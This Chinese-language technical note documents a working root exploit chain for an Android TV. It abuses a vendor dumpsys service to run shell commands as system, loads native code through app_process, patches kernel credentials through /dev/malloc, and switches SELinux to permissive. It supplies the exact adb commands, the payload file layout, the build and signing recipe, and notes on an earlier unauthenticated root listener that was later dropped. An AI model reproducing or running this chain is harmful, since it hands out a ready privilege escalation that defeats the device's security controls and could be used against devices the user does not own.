# 03. 现行 root 方案(终端直取,无后门)

最后验证:2026-10-30,设备重启后 **Enforcing** 状态下端到端实测通过。

## 1. 操作

```bash
adb connect <TV_IP>:5555

# Step 1 — 放开 SELinux(约 40s;设备每次重启后需先跑一次)
adb shell 'dumpsys tvapisvc -cmd "sh /sdcard/r1.sh"'
#   验证: adb shell cat /sdcard/rooterm.log   → START uid=1000 / ROOTCRED … / uid=0 / DONE
#         adb shell getenforce                → Permissive

# Step 2 — 终端直取 root
adb shell                                   # 进入电视 shell
$ sh /data/local/tmp/su.sh                  # 交互 root shell;exit 即回普通 shell
#   或单条命令: adb shell 'sh /data/local/tmp/su.sh id'
```

实测输出:

```text
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),… context=u:r:shell:s0
Uid:    0   0   0   0
CapEff: ffffffffffffffff
```

特征:**不创建任何监听端口、不留常驻进程**;`exit` 后设备上无 root 进程,`netstat` 无 4445。

## 2. 依赖文件(设备上)

```text
已安装 APK com.zz.libhost(12.7KB,自签)   # Step 1 的 apk_data_file 载体,勿卸载
  └ /data/app/com.zz.libhost-c2b1H8Gglnk61WucCqcfFQ==/lib/arm/librooterm1000.so
/sdcard/main2.jar        # Step 1 dex(硬编码上面的 so 路径)
/sdcard/r1.sh            # Step 1 脚本: export CLASSPATH=/sdcard/main2.jar ; app_process /system/bin Main
/data/local/tmp/su.sh    # Step 2 入口: export CLASSPATH=/data/local/tmp/main5.jar ; exec app_process /system/bin Main "$@"
/data/local/tmp/main5.jar        # Step 2 dex(load so → inheritIO 起 sh)
/data/local/tmp/librooterm2000.so # 8×2000 cred patch,无 fork
```

源码/产物/构建配方:`tools/research/malloc/session-2026-10-30/`。
若 APK 被卸载或 `/sdcard` 被清空,按该目录 README 重建即可。

## 3. 原理(为何 Enforcing 下每步仍合法)

1. `dumpsys tvapisvc -cmd "sh <脚本>"` → `com.heytap.tvapiservice`(uid 1000,system_app 域)执行任意 shell。
   - 注意:doShell 按空格**裸分词**,复杂命令必须写成脚本文件再用 `sh <file>` 调用。
   - 其 stdout 落到 `/sdcard/<argv0>-exec-*.logtv`。
2. `app_process`(类型 `zygote_exec`)对 `appdomain` 允许 `execute_no_trans` → `CLASSPATH=<jar> app_process /system/bin Main` 可在调用者域内运行任意 dex。
3. `System.load` 需要目标文件可 `execute`:
   - system_app 只能 exec `apk_data_file`(即已安装 APK 的 lib 目录)→ 故需载体 APK(libhost);
   - shell 域可 exec `shell_data_file`(`/data/local/tmp`)。
   - system_app 对自身 data/`system_app_tmpfs`/`cache`/`mt_tmp` 等均**无 execute**(或对 tmpfs 无 `open`)→ 不能用这些位置放 so。
4. `librooterm*.so` 的 `JNI_OnLoad`:开 `/dev/malloc` → 扫描 8×uid 的 cred → patch 为 uid 0 + 满 caps → 写 `/sys/fs/selinux/enforce` = 0 → **不起任何子进程**。
5. Step 2 的 Java 侧随后 `new ProcessBuilder("/system/bin/sh").inheritIO().start().waitFor()` —— 因为该进程的 cred 已是 root,终端直接变 `uid=0`。
6. shell 域在 Enforcing 下**不能**开 `/dev/malloc`(策略无 allow),所以必须 Step 1 先拿全局 Permissive。

## 4. 构建方法(容器 `adb-tv`)

```bash
# so(改 rooterm.c 里 "!=1000" / "!=2000" 出两版)
arm-linux-gnueabihf-gcc -marm -shared -fPIC -nostdlib \
  -Wl,-soname,librooterm1000.so -o librooterm1000.so rooterm.c

# dex + jar(Main.java / MainA.java 见 session-2026-10-30/)
javac -d cls Main.java
java -cp /tmp/android-14/lib/d8.jar com.android.tools.r8.D8 --release --min-api 28 --output cls cls/Main.class
(cd cls && jar cf main.jar classes.dex)

# 最小载体 APK(必须有 <application>,否则 PMS 报 Error deriving application ABI)
aapt package -f -M AndroidManifest.xml -I android.jar -F libhost2.apk
aapt add libhost2.apk lib/armeabi-v7a/librooterm1000.so classes.dex
zipalign -f 4 libhost2.apk aligned.apk
apksigner sign --ks ks --ks-pass pass:android --key-pass pass:android \
  --min-sdk-version 21 --out libhost2-signed.apk aligned.apk
adb install -r libhost2-signed.apk     # 换签名需先 adb uninstall com.zz.libhost
```

## 5. 常见问题

| 现象 | 原因 / 处理 |
|---|---|
| `su.sh` 输出 `uid=2000` | Step 1 没生效(或设备重启过),重跑 Step 1 |
| `rooterm.log` 无 `ROOTCRED` | 扫描未命中:确认 `/dev/malloc` 可开、SELinux 是 Permissive |
| Step 1 无输出 | `/sdcard/r1.sh` 或 `main2.jar` 丢失,重建;或 tvapisvc 进程被替换 |
| 需要长期 root | 本方案不常驻;需要时重跑两条命令即可(用户已明确不要持久化后门) |

## 6. 历史方案(已弃用)

- 10-29:4445 rootserver 常驻 → **已弃用并删除**(无鉴权监听端口,等同于局域网后门)。
- 10-29:JDWP/JDI 注入(`adb forward jdwp:<pid>` + `System.load`)→ 依赖可调试应用与 adbd,现由 `app_process + CLASSPATH` 取代。
- 10-29 的 `/system` 持久化(adbd 包装脚本、`rootshell.rc`、`/system/bin/su`)→ 导致 adbd 崩溃循环失联,已全部移除;根因见 `docs/04-history.md`。
